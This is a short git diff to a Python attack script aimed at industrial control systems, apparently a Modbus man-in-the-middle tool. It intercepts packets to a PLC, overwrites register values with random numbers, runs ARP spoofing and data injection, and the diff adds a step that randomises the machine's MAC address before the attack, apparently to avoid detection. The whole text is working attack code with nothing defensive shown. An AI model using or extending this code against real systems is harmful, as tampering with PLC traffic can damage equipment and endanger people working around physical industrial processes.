@@ -56,7 +56,7 @@ def process_pkt(packet):
         if func == 16:
                 c = z[TCP].outputsValue
                 z.outputsValue = randrange(10000, 20000)
-                print("Register {add}, change {v1} to {v2}".format(add=z.startAddr, v1=c, v2=z.outputsValue))
+                print("Register {add}, change {v1} to {v2}".format(add=startAddr, v1=c, v2=z.outputsValue))
         elif func == 5:
                 if z[IP].dst == plc_ip:
                         if z.outputValue == 65280:
@@ -90,7 +90,15 @@ def data_injection():
 		sleep(3)
 	queue.unbind()
 
+def change_mac():
+        process = os.popen('macchanger -r eth0')
+        out1 = process.read()
+        process.close()
+        print(out1)
+        sleep(1)
+
 def main():
+        change_mac()
 	get_ip()
 	arp_spoofing()
 	data_injection()
